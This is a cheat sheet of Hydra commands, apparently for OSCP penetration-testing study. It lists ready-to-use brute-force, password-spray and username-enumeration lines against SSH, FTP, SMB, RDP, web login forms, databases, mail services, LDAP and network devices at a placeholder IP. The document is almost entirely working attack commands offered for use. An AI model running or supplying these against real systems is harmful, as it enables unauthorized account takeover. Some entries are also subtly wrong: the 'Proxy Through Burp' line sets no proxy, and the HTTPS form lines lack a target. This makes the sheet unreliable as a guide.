# Hydra

```
# SSH Brute Force
hydra -l root -P passwords.txt ssh://10.10.10.10
hydra -L users.txt -P passwords.txt ssh://10.10.10.10

# FTP Brute Force
hydra -l anonymous -P passwords.txt ftp://10.10.10.10
hydra -L users.txt -P passwords.txt ftp://10.10.10.10

# SMB Brute Force
hydra -l administrator -P passwords.txt smb://10.10.10.10
hydra -L users.txt -P passwords.txt smb://10.10.10.10

# RDP Brute Force
hydra -l administrator -P passwords.txt rdp://10.10.10.10
hydra -L users.txt -P passwords.txt rdp://10.10.10.10

# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://10.10.10.10/protected
hydra -L users.txt -P passwords.txt http-get://10.10.10.10/protected

# HTTP POST Login Form
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"

# HTTPS POST Login Form
hydra -l admin -P passwords.txt https-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"

# HTTP GET Login Form
hydra -l admin -P passwords.txt 10.10.10.10 http-get-form "/login.php:user=^USER^&pass=^PASS^:Invalid"

# MySQL Brute Force
hydra -l root -P passwords.txt mysql://10.10.10.10

# MSSQL Brute Force
hydra -l sa -P passwords.txt mssql://10.10.10.10

# PostgreSQL Brute Force
hydra -l postgres -P passwords.txt postgres://10.10.10.10

# VNC Brute Force
hydra -P passwords.txt vnc://10.10.10.10

# Telnet Brute Force
hydra -l admin -P passwords.txt telnet://10.10.10.10

# POP3 Brute Force
hydra -l user -P passwords.txt pop3://10.10.10.10

# IMAP Brute Force
hydra -l user -P passwords.txt imap://10.10.10.10

# SMTP Brute Force
hydra -l user -P passwords.txt smtp://10.10.10.10

# SNMP Brute Force
hydra -P community.txt snmp://10.10.10.10

# LDAP Brute Force
hydra -l admin -P passwords.txt ldap2://10.10.10.10

# Cisco Enable Password Brute Force
hydra -P passwords.txt cisco-enable://10.10.10.10

# SOCKS5 Brute Force
hydra -L users.txt -P passwords.txt socks5://10.10.10.10

# SMB NTLM Domain Authentication
hydra -L users.txt -P passwords.txt smb://10.10.10.10 -m DOMAIN

# Specify Port
hydra -l root -P passwords.txt ssh://10.10.10.10 -s 2222

# Verbose Output
hydra -l root -P passwords.txt ssh://10.10.10.10 -V

# Very Verbose Output
hydra -l root -P passwords.txt ssh://10.10.10.10 -d

# Stop After First Valid Credential
hydra -l root -P passwords.txt ssh://10.10.10.10 -f

# Restore Previous Session
hydra -R

# Save Output
hydra -l root -P passwords.txt ssh://10.10.10.10 -o hydra.txt

# Increase Threads
hydra -l root -P passwords.txt ssh://10.10.10.10 -t 64

# Add Delay Between Attempts
hydra -l root -P passwords.txt ssh://10.10.10.10 -W 3

# Password Spray
hydra -L users.txt -p 'Password123' ssh://10.10.10.10

# Use Colon-Separated User:Pass File
hydra -C creds.txt ssh://10.10.10.10

# Ignore SSL Certificate
hydra -l admin -P passwords.txt https-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -k

# Proxy Through Burp
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -s 80 -V -I

# Enumerate Valid Users via SSH
hydra -L users.txt -p invalid ssh://10.10.10.10 -V

# Brute Force Multiple Targets
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# IPv6 Target
hydra -l root -P passwords.txt ssh://[2001:db8::1]

# Common OSCP Commands
hydra -L users.txt -P passwords.txt ssh://10.10.10.10
hydra -L users.txt -P passwords.txt ftp://10.10.10.10
hydra -L users.txt -P passwords.txt smb://10.10.10.10
hydra -L users.txt -P passwords.txt rdp://10.10.10.10
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -p 'Password123' ssh://10.10.10.10
hydra -C creds.txt ssh://10.10.10.10
```
